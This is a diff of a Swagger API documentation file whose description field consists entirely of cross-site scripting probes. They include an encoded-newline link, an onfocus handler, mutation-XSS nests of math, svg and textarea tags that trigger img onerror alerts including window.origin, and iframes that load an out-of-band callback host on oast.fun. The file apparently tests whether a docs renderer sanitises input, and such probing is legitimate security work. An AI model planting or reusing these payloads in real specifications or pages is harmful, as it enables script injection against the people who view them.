@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    This is a test :) [link](https://www.google.com%0Aalert) <a href="http://example.com/" target="_self" onfocus=print()>example</a> <iframe src="https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun" width=300px height=300px></iframe>
+    This is a test :) [link](https://www.google.com%0Aalert) <a href="http://example.com/" target="_self" onfocus=print()>example</a> ![image](https://google.com/test.jpg)<iframe src="https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun" width=300px height=300px></iframe>
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
     <iframe src="https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun"></iframe>
